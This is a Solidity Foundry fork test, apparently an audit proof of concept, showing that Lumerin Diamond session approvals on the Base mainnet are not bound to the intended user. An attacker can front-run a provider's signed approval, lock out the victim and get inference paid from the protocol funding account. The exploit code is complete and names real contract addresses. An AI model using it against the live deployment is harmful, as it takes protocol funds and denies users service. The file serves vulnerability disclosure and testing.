// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface ILumerinDiamondMinimal {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external pure returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function getProvidersTotalClaimed() external view returns (uint256);
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
}

/// @title W3-A1 — Provider session approval is not bound to the intended user
/// @notice The provider signs an approval over (bidId, chainId, user, timestamp)
///         (see proxy-router morrpcmessage/abi.go + InitiateSessionResponse), but
///         SessionRouter._extractProviderApproval decodes the user address and
///         DISCARDS it. The error SessionApprovedForAnotherUser() exists in
///         ISessionRouter but is never used. Any third party that sees the
///         approval (e.g. in the mempool) can open a session for THEMSELVES
///         with it, consuming the single-use approval and locking the intended
///         user out (their retry reverts SessionDuplicateApproval). The
///         attacker pays for the session with their own stake (refunded in
///         full at close) while the provider is paid from the protocol funding
///         account — free inference at the protocol's expense.
/// @dev Fork test, pinned to Base block 60239987. No privileged accounts:
///      provider/victim/attacker are fresh test keys; the funding account is
///      only used as a MOR source via vm.prank (fork-local), never as a
///      signer of anything privileged.
contract ApprovalTheftPoC is Test {
    address internal constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address internal constant FUNDING = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;

    uint256 internal constant PROVIDER_KEY = 1;
    uint256 internal constant VICTIM_KEY = 2;
    uint256 internal constant ATTACKER_KEY = 3;

    address internal provider;
    address internal victim;
    address internal attacker;

    uint256 internal constant PRICE_PER_SECOND = 1e14; // 0.0001 MOR/s, within [1e10, 1e16]
    uint256 internal constant PROVIDER_STAKE = 100 ether;
    uint256 internal constant ATTACKER_STAKE = 10_000 ether;

    bytes32 internal bidId;
    bytes internal approval;
    bytes internal approvalSig;

    function setUp() public {
        vm.createSelectFork("https://mainnet.base.org", 60_239_987);
        provider = vm.addr(PROVIDER_KEY);
        victim = vm.addr(VICTIM_KEY);
        attacker = vm.addr(ATTACKER_KEY);

        vm.deal(provider, 10 ether);
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 10 ether);

        // Fund test accounts with MOR from the funding account (fork-local prank).
        vm.prank(FUNDING);
        IERC20Minimal(MOR).transfer(provider, 150 ether);
        vm.prank(FUNDING);
        IERC20Minimal(MOR).transfer(victim, 1_010 ether);
        vm.prank(FUNDING);
        IERC20Minimal(MOR).transfer(attacker, ATTACKER_STAKE);

        // Provider registers, registers a model, posts a bid.
        vm.startPrank(provider);
        IERC20Minimal(MOR).approve(DIAMOND, type(uint256).max);
        ILumerinDiamondMinimal(DIAMOND).providerRegister(provider, PROVIDER_STAKE, "poc.example:8080");
        bytes32 baseModelId = bytes32(uint256(0x1111));
        ILumerinDiamondMinimal(DIAMOND).modelRegister(
            provider, baseModelId, bytes32(uint256(0x2222)), 0, 1 ether, "poc-model", new string[](0)
        );
        bytes32 modelId = ILumerinDiamondMinimal(DIAMOND).getModelId(provider, baseModelId);
        bidId = ILumerinDiamondMinimal(DIAMOND).postModelBid(provider, modelId, PRICE_PER_SECOND);
        vm.stopPrank();

        // Provider signs an approval INTENDED FOR THE VICTIM ONLY.
        uint128 ts = uint128(block.timestamp);
        approval = abi.encode(bidId, block.chainid, victim, ts);
        bytes32 approvalHash = keccak256(approval);
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", approvalHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_KEY, ethHash);
        approvalSig = abi.encodePacked(r, s, v);
    }

    function _signReceipt(bytes32 sessionId) internal view returns (bytes memory receipt, bytes memory sig) {
        receipt = abi.encode(sessionId, block.chainid, uint128(block.timestamp), uint32(1000), uint32(100));
        bytes32 receiptHash = keccak256(receipt);
        bytes32 ethReceiptHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", receiptHash));
        (uint8 rv, bytes32 rr, bytes32 rs) = vm.sign(PROVIDER_KEY, ethReceiptHash);
        sig = abi.encodePacked(rr, rs, rv);
    }

    function test_approvalTheft() public {
        ILumerinDiamondMinimal diamond = ILumerinDiamondMinimal(DIAMOND);
        IERC20Minimal mor = IERC20Minimal(MOR);

        // NOTE on validity: the approval below is signed by the provider for
        // the VICTIM (see setUp). That the signature itself is valid is proven
        // by the attacker's openSession succeeding through the identical
        // _isValidProviderReceipt check (and, on the anvil fork run, by a
        // victim simulation returning a session id before the theft). The only
        // check that is missing is the user binding.

        uint256 fundingBefore = mor.balanceOf(FUNDING);
        uint256 providerBefore = mor.balanceOf(provider);
        uint256 claimedBefore = diamond.getProvidersTotalClaimed();

        // 1. THEFT: the attacker (never the intended user) opens a session
        //    with the victim's approval. This MUST revert if the user binding
        //    were enforced — it does not.
        // Harness fix (Worker 4, 2026-11-21): was vm.prank(attacker) before
        // approve() only — prank is consumed by the approve call, so
        // openSession arrived with msg.sender = this test contract and
        // reverted InsufficientRightsForOperation (the diamond's delegate
        // check requires msg.sender == user_ or a registered delegate).
        // startPrank keeps msg.sender == attacker for both calls, matching
        // the anvil run where the attacker EOA sent both txs directly.
        vm.startPrank(attacker);
        mor.approve(DIAMOND, ATTACKER_STAKE);
        uint128 openedAt = uint128(block.timestamp);
        bytes32 sessionId = diamond.openSession(attacker, ATTACKER_STAKE, false, approval, approvalSig);
        vm.stopPrank();
        assertTrue(sessionId != bytes32(0), "attacker session must open (BUG)");
        assertEq(mor.balanceOf(attacker), 0, "attacker stake escrowed in diamond");

        // 2. LOCKOUT: the intended victim's retry reverts — approval consumed.
        // (Same harness fix: startPrank so openSession's msg.sender is the
        // victim, not this test contract.)
        vm.startPrank(victim);
        mor.approve(DIAMOND, 1_000 ether);
        vm.expectRevert(abi.encodeWithSignature("SessionDuplicateApproval()"));
        diamond.openSession(victim, 1_000 ether, false, approval, approvalSig);
        vm.stopPrank();

        // 3. Run the session to its end and close it with a valid receipt.
        uint128 endsAt = diamond.getSessionEnd(ATTACKER_STAKE, PRICE_PER_SECOND, openedAt);
        uint256 expectedReward = (uint256(endsAt) - uint256(openedAt)) * PRICE_PER_SECOND;
        assertGt(expectedReward, 0, "session must earn a reward");
        vm.warp(uint256(endsAt) + 1);

        (bytes memory receipt, bytes memory receiptSig) = _signReceipt(sessionId);
        vm.prank(attacker);
        diamond.closeSession(receipt, receiptSig);

        // 4. Settlement: provider paid from the FUNDING account, attacker
        //    refunded (part immediately, part on hold until next UTC midnight).
        {
            uint256 providerGain = mor.balanceOf(provider) - providerBefore;
            uint256 fundingLoss = fundingBefore - mor.balanceOf(FUNDING);
            assertEq(providerGain, expectedReward, "provider paid full stipend from funding");
            assertEq(fundingLoss, expectedReward, "funding account paid it");
            assertEq(
                diamond.getProvidersTotalClaimed() - claimedBefore,
                expectedReward,
                "claimed accounting matches"
            );
        }
        (uint256 available, uint256 held) = diamond.getUserStakesOnHold(attacker, 10);
        assertEq(available + held + mor.balanceOf(attacker), ATTACKER_STAKE, "attacker stake fully accounted");

        // 5. After the hold expires the attacker is whole: net MOR cost 0.
        vm.warp(uint256(endsAt) + 2 days);
        vm.prank(attacker);
        diamond.withdrawUserStakes(attacker, 10);
        assertEq(mor.balanceOf(attacker), ATTACKER_STAKE, "attacker recovered full stake; service was free");
    }
}
